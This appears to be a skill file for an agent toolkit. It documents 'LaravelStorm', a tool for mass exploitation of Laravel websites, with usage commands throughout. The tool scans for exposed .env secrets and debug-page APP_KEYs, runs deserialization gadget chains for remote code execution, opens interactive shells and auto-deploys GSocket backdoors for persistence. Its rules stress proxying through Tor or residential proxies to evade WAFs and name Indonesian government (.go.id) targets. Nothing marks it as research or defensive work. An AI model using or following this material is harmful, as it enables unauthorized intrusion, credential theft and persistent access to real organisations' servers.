---
name: laravelstorm
description: Laravel mass exploitation - .env scan, debug APP_KEY leak, 10-chain deserialization RCE, interactive shell, SLiMS scanner, auto GSocket deploy. Single Go binary.
---

# LaravelStorm v2.0 — Unified Laravel Mass Exploitation Framework

## Binary
`~/Hephaestus/tools/laravelstorm/laravelstorm` (also `~/bin/laravelstorm`)

## Source
`~/Hephaestus/tools/laravelstorm/` (Go, 7 files, package main)

## Modes

### Phase 0: Target List
One domain per line. For RCE mode: `URL|APP_KEY` format (pipe-delimited).

### Phase 1: env — .env Mass Scanner
```bash
laravelstorm env -f targets.txt -t 200 -o env_results.txt [-p socks5://proxy:port]
```
- Checks 20 .env path variants per target (/.env, /core/.env, /api/.env, etc.)
- Extracts: APP_KEY, DB_HOST, DB_USER, DB_PASS, MAIL_*, AWS_*
- Output: `URL|APP_KEY` format (direct input for `rce` mode)
- Domain dedup: one hit per domain, skips remaining paths

### Phase 2: debug — Debug Page APP_KEY Scanner
```bash
laravelstorm debug -f targets.txt -t 100 -o debug_results.txt
```
- Tests 9 paths x 3 methods (GET/POST/PUT) = 27 probes per target
- Paths include: /%00, ///////nonexistent (trigger error pages)
- Extracts APP_KEY from Whoops/Ignition debug pages
- Output: `URL|APP_KEY` format

### Phase 3: rce — Mass RCE Exploiter
```bash
laravelstorm rce -f keys.txt -t 50 -o rce_results.txt [--gs]
```
- Input: `URL|APP_KEY` file (output from env/debug)
- 10 PHP deserialization gadget chains (PendingBroadcast, Mockery, DatabaseManager, QueueManager, etc.)
- Tests across 10 URL paths per target
- Validates with dual commands: `id` + `echo zcvvvv1337`
- `--gs` flag: auto-deploys GSocket after confirmed RCE
- GSocket: downloads gs-netcat, starts daemon on port 443, reports secret

### Phase 4: shell — Interactive Shell
```bash
laravelstorm shell -u https://target.com -k "base64:APP_KEY_HERE"
```
- Auto-discovers working gadget chain + URL path + cookie name
- Shows uid, uname, pwd on connect
- Interactive command prompt
- Built-in `gsocket SECRET` command for persistence deployment
- Strips HTML from responses for clean output

### Phase 5: slims — SLiMS Scanner
```bash
laravelstorm slims -f targets.txt -t 100 -o slims_results.txt
```
- Follows redirects (up to 3) to find actual host
- POSTs `{"action":"system-requirement"}` to /install/api.php
- Validates JSON response structure
- Output: vulnerable URLs for slims_ssrf_rce.py

### Full Auto Mode
```bash
laravelstorm auto -f targets.txt -t 100 --gs -o campaign_dir/
```
**Pipeline: env scan → debug scan → merge keys → RCE exploit → GSocket deploy → summary**
- Creates output directory with: env_keys.txt, debug_keys.txt, rce_confirmed.txt
- Deduplicates APP_KEYs across env + debug results
- Adjusts thread counts per phase (env=full, debug=half, rce=half)
- Final summary with totals: targets, keys, RCE, GSocket, sudo

## Gadget Chains (10)
| # | Chain | Target |
|---|-------|--------|
| 1 | PendingBroadcast → Faker\Generator | Laravel 5.5-5.8 |
| 2 | PendingBroadcast → Events\Dispatcher | Laravel 5.x |
| 3 | PendingBroadcast → Notifications\ChannelManager | Laravel 5.5+ |
| 4 | PendingBroadcast → Validation\Validator | Laravel 5.x |
| 5 | PendingBroadcast → Mockery\EvalLoader | Laravel 5.4-6.x |
| 6 | MessageBag → Mockery (deeper nesting) | Filter bypass |
| 7 | Swift_KeyCache → Faker\ValidGenerator | SwiftMailer chain |
| 8 | DatabaseManager → array_filter | DB manager abuse |
| 9 | QueueManager → Auth\RequestGuard | Queue chain |
| 10 | GuzzleHttp\FileCookieJar | File write |

## Encryption
Replicates Laravel's `Illuminate\Encryption\Encrypter::encrypt()`:
- AES-256-CBC with random IV
- HMAC-SHA256 over base64(iv)+base64(ciphertext)
- JSON envelope `{"iv","value","mac","tag"}`
- Base64-encoded outer layer
- Key normalization: strips `base64:` prefix, SHA-256 for non-standard lengths

## Proxy Support
All modes support `-p` flag:
```bash
laravelstorm env -f targets.txt -p socks5://127.0.0.1:9050    # Tor
laravelstorm env -f targets.txt -p http://proxy:8080           # HTTP proxy
laravelstorm env -f targets.txt -p socks5://user:pass@bd:port  # BrightData
```

## Integration with Hephaestus
- Output files directly usable by spray_engine.py, leakradar.py
- JSON mode (`--json`) for programmatic consumption
- GSocket secrets compatible with gs-netcat verification
- Results stored in ~/Hephaestus/output/laravelstorm_results/

## Critical Rules
- ALWAYS use proxy (`-p`) for mass scanning from VPS (datacenter IP = WAF flagged)
- For .go.id targets: use BD residential Indo proxy
- env mode first (fastest), then debug (slower), then rce (targeted)
- `--gs` flag only when you want persistence, not for recon
- Shell mode for manual exploration of confirmed targets
- SLiMS results feed into ~/Hephaestus/tools/exploit/slims/slims_ssrf_rce.py
